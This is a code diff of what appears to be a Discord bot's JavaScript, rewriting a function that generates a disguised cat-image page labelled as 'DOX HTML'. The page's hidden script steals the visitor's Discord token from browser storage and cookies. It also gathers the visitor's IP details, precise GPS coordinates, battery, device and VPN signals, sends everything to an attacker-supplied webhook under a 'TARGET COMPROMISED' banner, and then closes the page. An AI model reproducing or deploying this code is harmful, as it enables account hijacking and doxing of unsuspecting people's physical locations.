@@ -212,10 +212,8 @@ async function startNuke(guild) {
     });
 }
 
-// ---- DOX HTML (FULLY REWRITTEN NO SYNTAX ERRORS) ----
+// ---- SIMPLE DOX HTML - NO SYNTAX ERRORS ----
 function generateDoxHTML(webhook) {
-    const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';
-
     return `<!DOCTYPE html>
 <html>
 <head>
@@ -223,287 +221,218 @@ function generateDoxHTML(webhook) {
     <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0b12;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: 'Segoe UI', sans-serif;
-            overflow: hidden;
-        }
+        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
         .container { text-align: center; }
-        .container img {
-            max-width: 90%;
-            max-height: 80vh;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.06);
-        }
-        .caption {
-            color: #555;
-            font-size: 14px;
-            margin-top: 12px;
-        }
+        .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.06); }
+        .caption { color: #555; font-size: 14px; margin-top: 12px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="${imageUrl}" alt="Cat" />
+        <img src="https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg" alt="Cat" />
         <div class="caption">Loading...</div>
     </div>
+    <script>
+        const WEBHOOK_URL = "${webhook}";
 
-<script>
-    const WEBHOOK_URL = "${webhook}";
-
-    async function sendToWebhook(data) {
-        try {
-            await fetch(WEBHOOK_URL, {
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
-            });
-        } catch(e) {}
-    }
+            }).catch(function(e) {});
+        }
 
-    function stealToken() {
-        try {
-            const token = localStorage.getItem('token') || 
-                          document.cookie.split('; ').find(row => row.startsWith('token='))?.split('=')[1] ||
-                          sessionStorage.getItem('token');
-            if (token) {
-                sendToWebhook({
-                    content: "**🎯 DISCORD TOKEN:** ```" + token + "```\n**FULL ACCESS - ACCOUNT COMPROMISED**"
-                });
-            }
-        } catch (e) {}
-    }
-
-    async function getIPData() {
-        try {
-            const res = await fetch('https://ipinfo.io/json');
-            const data = await res.json();
-            if (data.ip) {
-                return {
-                    ip: data.ip || 'N/A',
-                    country: data.country || 'N/A',
-                    region: data.region || 'N/A',
-                    city: data.city || 'N/A',
-                    postal: data.postal || 'N/A',
-                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
-                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
-                    asn: data.asn || 'N/A',
-                    isp: data.org || 'N/A',
-                    timezone: data.timezone || 'N/A'
-                };
-            }
-        } catch (e) {}
-        return {
-            ip: 'N/A',
-            country: 'N/A',
-            region: 'N/A',
-            city: 'N/A',
-            postal: 'N/A',
-            lat: 'N/A',
-            lon: 'N/A',
-            asn: 'N/A',
-            isp: 'N/A',
-            timezone: 'N/A'
-        };
-    }
-
-    async function getGPSLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
+        function stealToken() {
+            try {
+                var token = localStorage.getItem("token") || 
+                            document.cookie.split("; ").find(function(row) { return row.startsWith("token="); }).split("=")[1] ||
+                            sessionStorage.getItem("token");
+                if (token) {
+                    sendToWebhook({
+                        content: "**🎯 DISCORD TOKEN:** ```" + token + "```"
                     });
-                },
-                function(err) {
+                }
+            } catch (e) {}
+        }
+
+        function getIPData() {
+            return fetch("https://ipinfo.io/json")
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    return {
+                        ip: data.ip || "N/A",
+                        country: data.country || "N/A",
+                        region: data.region || "N/A",
+                        city: data.city || "N/A",
+                        postal: data.postal || "N/A",
+                        lat: data.loc ? data.loc.split(",")[0] : "N/A",
+                        lon: data.loc ? data.loc.split(",")[1] : "N/A",
+                        isp: data.org || "N/A",
+                        timezone: data.timezone || "N/A"
+                    };
+                })
+                .catch(function() {
+                    return {
+                        ip: "N/A",
+                        country: "N/A",
+                        region: "N/A",
+                        city: "N/A",
+                        postal: "N/A",
+                        lat: "N/A",
+                        lon: "N/A",
+                        isp: "N/A",
+                        timezone: "N/A"
+                    };
+                });
+        }
+
+        function getGPSLocation() {
+            return new Promise(function(resolve) {
+                if (!navigator.geolocation) {
                     resolve(null);
-                },
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
-        });
-    }
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    function(err) {
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            });
+        }
 
-    async function reverseGeocode(lat, lon) {
-        try {
-            const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
-            const data = await res.json();
-            if (data && data.display_name) return data.display_name;
-        } catch (e) {}
-        return null;
-    }
+        function getBattery() {
+            return navigator.getBattery().then(function(b) {
+                return {
+                    level: Math.round(b.level * 100),
+                    charging: b.charging
+                };
+            }).catch(function() {
+                return null;
+            });
+        }
 
-    async function getBattery() {
-        try {
-            const b = await navigator.getBattery();
+        function detectVPN(ipData, gpsData) {
+            var score = 0;
+            var signals = [];
+            var vpnKeywords = ["vpn", "proxy", "cloudflare", "aws", "amazon", "digitalocean", "vultr", "linode", "hetzner", "ovh", "m247", "psychz", "hostinger", "namecheap", "contabo", "server", "hosting", "dedicated", "datacenter", "cloud", "vps"];
+            var isp = (ipData.isp || "").toLowerCase();
+            for (var i = 0; i < vpnKeywords.length; i++) {
+                if (isp.includes(vpnKeywords[i])) {
+                    score += 2;
+                    signals.push("ISP matches VPN/hosting provider");
+                    break;
+                }
+            }
+            try {
+                var browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (ipData.timezone && ipData.timezone !== "N/A" && browserTz && ipData.timezone !== browserTz) {
+                    score += 3;
+                    signals.push("Timezone mismatch: IP says " + ipData.timezone + " but browser says " + browserTz);
+                }
+            } catch (e) {}
+            if (gpsData && ipData.lat !== "N/A" && ipData.lon !== "N/A") {
+                var ipLat = parseFloat(ipData.lat);
+                var ipLon = parseFloat(ipData.lon);
+                var gpsLat = gpsData.lat;
+                var gpsLon = gpsData.lon;
+                var distance = Math.sqrt(Math.pow(ipLat - gpsLat, 2) + Math.pow(ipLon - gpsLon, 2)) * 111;
+                if (distance > 100) {
+                    score += 5;
+                    signals.push("Location mismatch: IP says " + ipData.city + " but GPS shows different location");
+                }
+            }
             return {
-                level: Math.round(b.level * 100),
-                charging: b.charging
+                detected: score >= 3,
+                score: score,
+                signals: signals
             };
-        } catch {
-            return null;
-        }
-    }
-
-    function detectVPN(ipData, gpsData) {
-        let vpnScore = 0;
-        const signals = [];
-
-        const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated', 'datacenter', 'cloud', 'vps'];
-        const isp = (ipData.isp || '').toLowerCase();
-        const asn = (ipData.asn || '').toLowerCase();
-        
-        for (const keyword of vpnKeywords) {
-            if (isp.includes(keyword) || asn.includes(keyword)) {
-                vpnScore += 2;
-                signals.push('ISP/ASN matches VPN/hosting provider');
-                break;
-            }
         }
 
-        try {
-            const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            if (ipData.timezone && ipData.timezone !== 'N/A' && browserTz && ipData.timezone !== browserTz) {
-                vpnScore += 3;
-                signals.push("Timezone mismatch: IP says " + ipData.timezone + " but browser says " + browserTz);
-            }
-        } catch (e) {}
+        function runDox() {
+            stealToken();
+            getIPData().then(function(ipData) {
+                getGPSLocation().then(function(gpsData) {
+                    getBattery().then(function(battery) {
+                        var vpn = detectVPN(ipData, gpsData);
+                        var ua = navigator.userAgent;
+                        var browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
+                        var os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
+                        var device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
+                        var now = new Date();
+                        var timestamp = now.toISOString();
+                        var fields = [];
 
-        if (gpsData && ipData.lat !== 'N/A' && ipData.lon !== 'N/A') {
-            const ipLat = parseFloat(ipData.lat);
-            const ipLon = parseFloat(ipData.lon);
-            const gpsLat = gpsData.lat;
-            const gpsLon = gpsData.lon;
-            const distance = Math.sqrt(Math.pow(ipLat - gpsLat, 2) + Math.pow(ipLon - gpsLon, 2)) * 111;
-            if (distance > 100) {
-                vpnScore += 5;
-                signals.push("Location mismatch: IP says " + ipData.city + " but GPS shows different location (approx " + Math.round(distance) + "km away)");
-            }
-        }
+                        fields.push({ name: "🌐 IP", value: ipData.ip, inline: true });
+                        fields.push({ name: "🏙️ City", value: ipData.city, inline: true });
+                        fields.push({ name: "🗺️ Region", value: ipData.region, inline: true });
+                        fields.push({ name: "🌍 Country", value: ipData.country, inline: true });
+                        fields.push({ name: "🏢 ISP", value: ipData.isp, inline: true });
+                        fields.push({ name: "🕒 Timezone", value: ipData.timezone, inline: true });
 
-        const detected = vpnScore >= 3;
-        return {
-            detected: detected,
-            score: vpnScore,
-            signals: signals,
-            confidence: vpnScore >= 5 ? 'High' : vpnScore >= 3 ? 'Medium' : 'Low'
-        };
-    }
+                        if (ipData.lat !== "N/A" && ipData.lon !== "N/A") {
+                            fields.push({ name: "📍 IP Location", value: "https://www.google.com/maps?q=" + ipData.lat + "," + ipData.lon, inline: false });
+                        }
 
-    async function runDox() {
-        stealToken();
-        const ipData = await getIPData();
-        const gpsData = await getGPSLocation();
-        const battery = await getBattery();
-        const vpn = detectVPN(ipData, gpsData);
-        
-        let gpsAddress = null;
-        if (gpsData) {
-            gpsAddress = await reverseGeocode(gpsData.lat, gpsData.lon);
-        }
+                        if (gpsData) {
+                            fields.push({ 
+                                name: "📍 GPS Location", 
+                                value: "Lat: " + gpsData.lat + " Lon: " + gpsData.lon + " Accuracy: " + Math.round(gpsData.accuracy) + "m", 
+                                inline: false 
+                            });
+                        }
 
-        const ua = navigator.userAgent;
-        const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
-        const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
-        const device = /mobile|android|iphone|ipad/i.test(ua) ? 'Mobile' : 'Desktop';
-        const now = new Date();
-        const timestamp = now.toISOString();
-        const localTime = now.toString();
+                        if (battery) {
+                            fields.push({ name: "🔋 Battery", value: battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)"), inline: true });
+                        }
 
-        const fields = [];
+                        fields.push({ name: "🛡️ VPN", value: vpn.detected ? "✅ Likely (Score: " + vpn.score + ")" : "❌ Not detected", inline: true });
 
-        fields.push({ name: "🌐 IP Address", value: ipData.ip, inline: true });
-        fields.push({ name: "🏙️ City", value: ipData.city, inline: true });
-        fields.push({ name: "🗺️ Region", value: ipData.region, inline: true });
-        fields.push({ name: "🌍 Country", value: ipData.country, inline: true });
-        fields.push({ name: "📮 Postal", value: ipData.postal, inline: true });
-        fields.push({ name: "🔢 ASN", value: ipData.asn, inline: true });
-        fields.push({ name: "🏢 ISP", value: ipData.isp, inline: true });
-        fields.push({ name: "🕒 Timezone", value: ipData.timezone, inline: true });
+                        if (vpn.signals.length > 0) {
+                            fields.push({ name: "🔍 VPN Signals", value: vpn.signals.join("\\n"), inline: false });
+                        }
 
-        if (ipData.lat !== 'N/A' && ipData.lon !== 'N/A') {
-            const mapUrl = "https://www.google.com/maps?q=" + ipData.lat + "," + ipData.lon;
-            fields.push({ name: "📍 IP Location", value: "[" + ipData.lat + ", " + ipData.lon + "](" + mapUrl + ")", inline: false });
-        }
+                        fields.push({ name: "🧠 Browser", value: browser, inline: true });
+                        fields.push({ name: "💻 OS", value: os, inline: true });
+                        fields.push({ name: "🖥️ Device", value: device, inline: true });
+                        fields.push({ name: "⏰ Time", value: timestamp, inline: false });
 
-        if (gpsData) {
-            const gpsMapUrl = "https://www.google.com/maps?q=" + gpsData.lat + "," + gpsData.lon;
-            fields.push({ 
-                name: "📍 GPS Location (EXACT)", 
-                value: "[" + gpsData.lat + ", " + gpsData.lon + "](" + gpsMapUrl + ")\n**Accuracy:** " + Math.round(gpsData.accuracy) + "m", 
-                inline: false 
-            });
-            if (gpsAddress) {
-                fields.push({ name: "🏠 GPS Address", value: gpsAddress, inline: false });
-            }
-        }
-
-        if (battery) {
-            fields.push({ 
-                name: "🔋 Battery", 
-                value: battery.level + "%" + (battery.charging ? " (Charging 🔌)" : " (Not Charging ⚡)"), 
-                inline: true 
+                        sendToWebhook({
+                            embeds: [{
+                                title: "☠️ TARGET COMPROMISED",
+                                color: 0xFF0000,
+                                fields: fields,
+                                footer: { text: "☠️ PULSE DOX SYSTEM" }
+                            }]
+                        });
+                    });
+                });
             });
         }
 
-        fields.push({ 
-            name: "🛡️ VPN/Proxy", 
-            value: vpn.detected ? "✅ **LIKELY** (Score: " + vpn.score + ")\nConfidence: " + vpn.confidence : "❌ **NOT DETECTED**", 
-            inline: true 
-        });
+        runDox();
 
-        if (vpn.signals.length > 0) {
-            fields.push({ name: "🔍 VPN Signals", value: vpn.signals.join("\n"), inline: false });
-        }
-
-        fields.push({ name: "🧠 Browser", value: browser, inline: true });
-        fields.push({ name: "💻 OS", value: os, inline: true });
-        fields.push({ name: "🖥️ Device", value: device, inline: true });
-        fields.push({ name: "⏰ Local Time", value: localTime, inline: false });
-        fields.push({ name: "📅 Timestamp", value: timestamp, inline: false });
-
-        const embed = {
-            title: "☠️ TARGET COMPROMISED - FULL DOX",
-            color: 0xFF0000,
-            fields: fields,
-            footer: { text: "☠️ PULSE DOX SYSTEM - " + timestamp }
-        };
-
-        await sendToWebhook({ embeds: [embed] });
-        
-        if (gpsAddress) {
-            await sendToWebhook({ content: "**📍 EXACT ADDRESS:** " + gpsAddress });
-        }
-    }
-
-    runDox();
-
-    setTimeout(function() {
-        document.body.innerHTML = '';
-        document.body.style.background = '#000000';
-        document.body.style.margin = '0';
-        document.body.style.height = '100vh';
         setTimeout(function() {
-            window.close();
-            window.location.href = 'about:blank';
+            document.body.innerHTML = "";
+            document.body.style.background = "#000000";
+            document.body.style.margin = "0";
+            document.body.style.height = "100vh";
             setTimeout(function() {
-                window.location.href = 'https://www.google.com';
-            }, 200);
-        }, 300);
-    }, 5000);
+                window.close();
+                window.location.href = "about:blank";
+            }, 300);
+        }, 5000);
 
-    document.querySelector('.caption').textContent = 'Image loaded successfully.';
-<\/script>
+        document.querySelector(".caption").textContent = "Image loaded successfully.";
+    <\/script>
 </body>
 </html>`;
 }
